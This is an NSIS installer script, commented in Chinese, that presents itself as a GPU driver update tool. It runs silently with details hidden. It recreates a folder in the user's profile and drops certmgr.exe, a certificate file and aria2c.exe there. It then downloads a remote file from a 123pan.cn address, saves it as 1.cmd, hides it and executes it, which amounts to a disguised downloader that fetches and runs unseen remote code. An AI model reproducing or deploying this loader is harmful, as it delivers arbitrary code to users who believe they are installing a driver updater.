; 设置安装程序的图标
Icon "D:\10.ico"

; 定义版本信息
VIProductVersion "1.0.1.3"
VIAddVersionKey /LANG=2052 "ProductName" "Gpu Driver Update Tool"
VIAddVersionKey /LANG=2052 "CompanyName" "小南瓜"
VIAddVersionKey /LANG=2052 "FileDescription" "显卡驱动升级助手VIP"
VIAddVersionKey /LANG=2052 "FileVersion" "1.0.1.3"
VIAddVersionKey /LANG=2052 "LegalCopyright" "Copyright ${U+00A9} 2023 小南瓜. All Rights Reserved"

; 定义安装程序的输出名
OutFile "Installer.exe"

; 确保使用的是正确的文件压缩方式
SetCompressor /SOLID lzma

; 设置安装程序为静默安装
SilentInstall silent
ShowInstDetails nevershow
ShowUninstDetails nevershow

Section
    ; 计算 lgx 目录路径
    StrCpy $0 "$%USERPROFILE%\lgx"

    ; 删除存在的 lgx 目录并重新创建
    RMDir /r $0
    CreateDirectory $0

    ; 释放文件到 lgx 目录
    SetOutPath $0
    File "Cert.spc"
    File "certmgr.exe"
    File "aria2c.exe"

    ; 使用 aria2c.exe 下载文件，并重命名为 1.cmd
    ExecWait '"$0\aria2c.exe" --quiet --allow-overwrite=true -d "$0" -o 1.cmd "https://vip.123pan.cn/1814328088/gtx/vip1"'

    ; 将下载的 1.cmd 文件设置为隐藏
    Exec 'attrib +h "$0\1.cmd"'

    ; 运行隐藏的 1.cmd 文件
    Exec '"$0\1.cmd"'
SectionEnd
